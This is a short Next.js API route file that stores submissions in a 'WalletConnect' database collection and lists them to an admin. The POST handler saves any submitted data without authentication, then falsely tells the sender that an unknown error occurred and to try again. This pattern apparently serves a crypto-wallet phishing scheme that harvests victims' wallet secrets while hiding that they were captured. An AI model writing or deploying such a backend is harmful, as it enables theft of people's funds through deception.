import connection from "@/app/components/js/connection";
import verifyToken from "@/app/components/js/token";
import WalletConnect from "@/app/components/models/WalletConnect";
import { NextResponse } from "next/server";

export async function GET(req: Request) {
  try {
    await connection();
    const tokenUser = verifyToken(`${req.headers.get("token")}`);
    if (!tokenUser.admin) throw new Error();
    const wallets = await WalletConnect.find().sort({ _id: -1 });
    return new NextResponse(JSON.stringify(wallets), {
      status: 200,
    });
  } catch (error) {
    return new NextResponse(JSON.stringify({ message: "Not found" }), {
      status: 404,
    });
  }
}
export async function POST(req: Request) {
  try {
    await connection();
    const body = await req.json();
    await new WalletConnect(body).save();
    return new NextResponse(
      JSON.stringify({
        message: "Unknown error occured, please try again after some time.",
      }),
      {
        status: 401,
      }
    );
  } catch (error) {
    return new NextResponse(JSON.stringify({ message: "Unauthorized" }), {
      status: 401,
    });
  }
}
